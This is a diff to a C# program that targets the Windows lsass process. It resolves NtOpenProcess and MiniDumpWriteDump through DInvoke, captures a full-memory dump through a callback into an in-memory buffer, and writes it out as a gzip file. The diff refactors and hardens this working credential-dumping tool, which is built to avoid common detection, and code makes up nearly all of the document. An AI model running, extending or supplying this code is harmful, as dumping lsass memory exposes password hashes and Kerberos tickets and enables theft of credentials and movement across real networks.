@@ -1,19 +1,19 @@
 using System;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
-using DInvoke.DynamicInvoke;
 using System.IO;
 using System.IO.Compression;
+using System.Runtime.InteropServices;
+using DInvoke.DynamicInvoke;
 
-namespace MiniDump
+namespace DMiniDumpWrite
 {
     class Program
     {
-        public static byte[] dumpBuffer = new byte[200 * 1024 * 1024];
-        public static int bufferSize = 0;
+        // --- FIXED BUFFER ---
+        static byte[] dumpBuffer = new byte[200 * 1024 * 1024]; // 200 MB fixed
+        static int bufferSize = 0;
 
-        //callback
-
+        // --- CALLBACK STRUCTS ---
         public enum MINIDUMP_CALLBACK_TYPE
         {
             ModuleCallback,
@@ -51,27 +51,17 @@ namespace MiniDump
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct MINIDUMP_CALLBACK_INPUT
         {
-
             public int ProcessId;
             public IntPtr ProcessHandle;
             public MINIDUMP_CALLBACK_TYPE CallbackType;
             public MINIDUMP_IO_CALLBACK Io;
         }
 
-
         [StructLayout(LayoutKind.Sequential)]
         public struct MINIDUMP_CALLBACK_OUTPUT
         {
             public uint status;
-
         }
-
-
-        public delegate bool CallBack(
-            int CallbackParam,
-            IntPtr PointerCallbackInput,
-            IntPtr PointerCallbackOutput
-            );
 
         public struct MINIDUMP_CALLBACK_INFORMATION
         {
@@ -79,8 +69,13 @@ namespace MiniDump
             public IntPtr CallbackParam;
         }
 
-        //callback end
+        public delegate bool CallBack(
+            int CallbackParam,
+            IntPtr PointerCallbackInput,
+            IntPtr PointerCallbackOutput
+        );
 
+        // --- IMPORTS ---
         //NtOpenProcess
         [StructLayout(LayoutKind.Sequential)]
         public struct CLIENT_ID
@@ -134,12 +129,14 @@ namespace MiniDump
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool NtCloseHandleDelegate(IntPtr hObject);
 
-        
+        static CallBack PersistentCallback; // evita GC
+        static IntPtr mci_pointer = IntPtr.Zero;
 
-
-        static void Main(string[] args)
+        static void Main()
         {
-            string processName = "lsass";
+            try
+            {
+                string processName = "lsass";
                         
 
             Process[] processes = Process.GetProcessesByName(processName);
@@ -195,27 +192,21 @@ namespace MiniDump
                 return;
             }
 
-            try
-            {
-
-                //callback definition
-
-                CallBack MyCallBack = new CallBack(CallBackFunction);
+                // --- Callback  ---
+                PersistentCallback = new CallBack(CallBackFunction);
                 MINIDUMP_CALLBACK_INFORMATION mci;
-                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(MyCallBack);
+                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(PersistentCallback);
                 mci.CallbackParam = IntPtr.Zero;
-                IntPtr mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
+                mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
                 Marshal.StructureToPtr(mci, mci_pointer, true);
 
-                //callback end
-
-               
-
+                // --- calling MiniDumpWriteDump ---
+                //dumpType = 2 MiniDumpWithFullMemory
                 bool result = miniDumpWriteDump(
                     processHandle,
                     (uint)PID,
-                    IntPtr.Zero, 
-                    2, 
+                    IntPtr.Zero,
+                    2,
                     IntPtr.Zero,
                     IntPtr.Zero,
                     mci_pointer
@@ -223,75 +214,87 @@ namespace MiniDump
 
                 if (result)
                 {
-                    Console.WriteLine("[+] Memory dumpped.");
-                    MemoryStream memoryStream = new MemoryStream();
-                    memoryStream.Write(dumpBuffer, 0, bufferSize);
+                    Console.WriteLine("[+] Memory dumped, size: " + bufferSize);
 
-                    memoryStream.Position = 0;
-                    using (FileStream compressedFileStream = new FileStream("dump.dmp.gz", FileMode.Create, FileAccess.Write, FileShare.None))
+                    // --- Compress buffer ---
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        using (GZipStream compressionStream = new GZipStream(compressedFileStream, CompressionMode.Compress))
+                        ms.Write(dumpBuffer, 0, bufferSize);
+                        ms.Position = 0;
+
+                        using (FileStream compressedFile = new FileStream("dump.dmp.gz", FileMode.Create))
+                        using (GZipStream gzip = new GZipStream(compressedFile, CompressionMode.Compress))
                         {
-                            memoryStream.CopyTo(compressionStream);
-                            Console.WriteLine("[+] Dumpped to compressed file dump.dmp.gz.");
+                            ms.CopyTo(gzip);
                         }
                     }
+                    Console.WriteLine("[+] Compressed dump.dmp.gz created.");
                 }
                 else
                 {
-                    Console.WriteLine("[-] Error dumping memory.");
+                    Console.WriteLine("[-] Error dumping memory. GetLastError: " + Marshal.GetLastWin32Error());
                 }
-                
-               
-                closeHandle(processHandle);
-
-               
-
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Errorx: " + ex.Message);
+                Console.WriteLine("[-] Exception during dump: " + ex);
             }
-            
+            finally
+            {
+                // --- clean and free memory ---
+                if (mci_pointer != IntPtr.Zero)
+                {
+                    Marshal.FreeHGlobal(mci_pointer);
+                    mci_pointer = IntPtr.Zero;
+                }
+                Array.Clear(dumpBuffer, 0, bufferSize);
+                bufferSize = 0;
+                GC.KeepAlive(PersistentCallback);
+            }
         }
 
-        public static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
+        static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
         {
-
-            var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
-            var callbackOutput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(PointerCallbackOutput);
-
-            // IoStartCallback
-            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoStartCallback)
+            try
             {
-                
-                callbackOutput.status = 0x1;
-                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
-            }
+                var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
+                var callbackOutput = new MINIDUMP_CALLBACK_OUTPUT();
 
-            // IoWriteAllCallback
-            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback)
+                switch (callbackInput.CallbackType)
+                {
+                    case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
+                        callbackOutput.status = 0x1;
+                        Console.WriteLine("[+] Start Dumping");
+                        //Console.WriteLine("[CB] IoStartCallback invoked");
+                        break;
+
+                    case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
+                        if (callbackInput.Io.Buffer != IntPtr.Zero && callbackInput.Io.BufferBytes > 0)
+                        {
+                            // fixed buffer, only cast int is secure
+                            int requiredSize = (int)(callbackInput.Io.Offset + (ulong)callbackInput.Io.BufferBytes);
+                            Marshal.Copy(callbackInput.Io.Buffer, dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
+                            bufferSize = Math.Max(bufferSize, requiredSize);
+                            //Console.WriteLine($"[CB] IoWriteAllCallback: Offset={callbackInput.Io.Offset}, Bytes={callbackInput.Io.BufferBytes}"); 
+                        }
+                        callbackOutput.status = 0;
+                        break;
+
+                    case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
+                        callbackOutput.status = 0;
+                        Console.WriteLine("[+] Finish Dumping");
+                        //Console.WriteLine("[CB] IoFinishCallback invoked");
+                        break;
+                }
+
+                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+                return true;
+            }
+            catch (Exception ex)
             {
-               
-                Marshal.Copy(callbackInput.Io.Buffer, dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
-                bufferSize += callbackInput.Io.BufferBytes;
-                
-                callbackOutput.status = 0;
-                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
+                Console.WriteLine("[-] Exception in callback: " + ex);
+                return false;
             }
-
-            // IoWriteAllCallback
-            if (callbackInput.CallbackType == MINIDUMP_CALLBACK_TYPE.IoFinishCallback)
-            {
-                
-                callbackOutput.status = 0;
-                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
-            }
-
-            return true; 
         }
-
-
     }
 }
-
